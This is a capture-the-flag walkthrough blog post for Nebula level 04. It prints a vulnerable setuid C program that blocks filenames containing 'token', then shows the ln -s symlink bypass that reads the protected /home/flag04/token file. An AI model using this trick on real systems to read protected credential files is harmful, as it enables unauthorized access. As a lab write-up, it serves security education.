@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="shortcut icon" type="image/png" href="/assets/image/mythical-bits-logo-1.png">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <title>Nebula Series - Level 04</title>
+  </head>
+  <body>
+    <div id='header'>
+      <img id='logo' src="/assets/image/mythical-bits-logo-1.png" alt="logo"/>
+      <h1> Mythical Bits </h1>
+    </div>
+    <hr />
+    <div id='container'>
+      <div id='nav'>
+  <a href="/index.html">Home</a>
+</div>
+<div class='post-container'>
+  <h3> Nebula Series - Level 04</h3>
+  <p>27 Apr 2020</p>
+  <hr class='post-title-line'/>
+  <!--more-->
+
+<p>Ok, so the first thing to understand is that depending on filenames to prevent unauthorized access is a terrible idea.</p>
+
+<p>Our goal for this level is to obtain the value stored in the <code class="language-plaintext highlighter-rouge">/home/flag04/token</code> file. We’re provided with the following
+source code for the executable at <code class="language-plaintext highlighter-rouge">/home/flag04/flag04</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"%s [file to read]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"token"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"You may not access '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to open %s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="p">}</span>
+
+  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to read fd %d"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It first checks that more than one argument is supplied.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"%s [file to read]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The reason it’s testing <code class="language-plaintext highlighter-rouge">argc == 1</code> is because the first argument
+is always the name of the executable itself.</p>
+
+<p>Next it checks if the supplied filename contains the substring “token” using <code class="language-plaintext highlighter-rouge">strstr</code> from the C stdlib.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"token"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"You may not access '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>If the substring is found, the app exits after informing the user that they are not allowed to access that file.</p>
+
+<p>We’ll want to avoid this.</p>
+
+<p>Next it opens and reads the file into the buffer</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to open %s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="p">}</span>
+
+  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to read fd %d"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>And finally, it writes the contents to stdout.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The first argument here is a file descriptor; in this case it’s file descriptor 1 - aka STDOUT.</p>
+
+<p>Alright so how do we sirsumvent the security checks?</p>
+
+<p>Enter symbolic links.</p>
+
+<p>A symbolic link is essentially a named pointer to another file. We can create a symbolic link that doesn’t contain “token” in
+its name and point it at the token file like</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@nebula:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/flag04/token /tmp/trickedya
+
+level04@nebula:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp
+total 0
+lrwxrwxrwx 1 level04 level04 18 2020-04-10 09:00 trickedya -&gt; /home/flag04/token
+</code></pre></div></div>
+
+<p>Now all that’s left is to run the app again but hand it the symlink</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@nebula:~<span class="nv">$ </span>/home/flag04/flag04 /tmp/trickedya
+06508b5e-8909-4f38-b630-fdb148a848a2
+</code></pre></div></div>
+
+<p>And there it is – the token we weren’t supposed to see!</p>
+
+<p>In summary:</p>
+
+<ul>
+  <li>Don’t hand-roll your own security</li>
+</ul>
+
+</div>
+
+    </div>
+  </body>
+</html>
+
